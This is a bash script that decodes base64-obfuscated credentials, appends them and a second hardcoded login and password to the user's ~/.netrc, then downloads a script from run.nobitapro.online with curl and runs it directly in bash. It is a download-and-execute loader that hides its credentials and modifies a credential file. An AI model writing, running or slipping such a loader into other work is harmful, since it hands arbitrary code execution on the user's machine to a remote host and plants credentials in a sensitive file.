#!/usr/bin/env bash
# Base64-obfuscated creds -> .netrc -> curl --netrc -> run
set -euo pipefail

URL="https://run.nobitapro.online"
HOST="run.nobitapro.online"
NETRC="${HOME}/.netrc"

b64d() { printf '%s' "$1" | base64 -d; }

USER_B64="bm9iaXRh"
PASS_B64="bm9iaXRhMTIz"

USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
  echo "Credential decode failed." >&2
  exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
  echo "Error: curl is required but not installed." >&2
  exit 1
fi

touch "$NETRC"
chmod 600 "$NETRC"

tmpfile="$(mktemp)"
grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
mv "$tmpfile" "$NETRC"

{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "$USER_RAW"
  printf 'password %s\n' "$PASS_RAW"
} >> "$NETRC"

# second account added as requested
{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "user-www"
  printf 'password %s\n' "r3frwsrfrq"
} >> "$NETRC"

script_file="$(mktemp)"
cleanup() { rm -f "$script_file"; }
trap cleanup EXIT

if curl -fsS --netrc -o "$script_file" "$URL"; then
  bash "$script_file"
else
  echo "Authentication or download failed." >&2
  exit 1
fi
